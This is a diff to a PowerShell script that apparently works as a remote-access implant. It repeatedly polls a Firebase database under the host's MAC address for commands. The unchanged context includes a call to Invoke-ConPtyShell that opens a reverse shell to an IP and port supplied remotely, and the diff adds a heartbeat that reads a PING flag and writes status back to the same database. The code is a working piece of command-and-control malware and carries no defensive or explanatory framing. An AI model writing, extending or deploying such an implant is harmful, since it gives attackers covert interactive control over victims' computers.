@@ -1,9 +1,13 @@
 $primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
 $url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/$($primaryAdapter.MacAddress)/state.json"
+# PING the Firebase Realtime Database (url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/PING")
+$pingUrl = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/PING.json"
 
 while ($true) {
     $response = Invoke-RestMethod -Uri $url
     $state = $response
+    $ping = Invoke-RestMethod -Uri $pingUrl
+
     # Write-Output ("State type: " + $state.GetType().FullName)
 
     if ($state -eq "null") {
@@ -70,6 +74,22 @@ while ($true) {
                 Invoke-ConPtyShell "$ip" "$port"
             } | Out-Null
         }
+    }
+
+    elseif ($ping -eq 1) {
+        $stateChild = @{
+            "PING" = 0
+        } | ConvertTo-Json
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/TCP.json') -Method PUT -Body $stateChild | Out-Null
+        
+        start-sleep -Seconds 5
+
+        $stateChild = @{
+            "PING" = 1
+        } | ConvertTo-Json
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/TCP.json') -Method PUT -Body $stateChild | Out-Null
     }
 
     Start-Sleep -Seconds 5
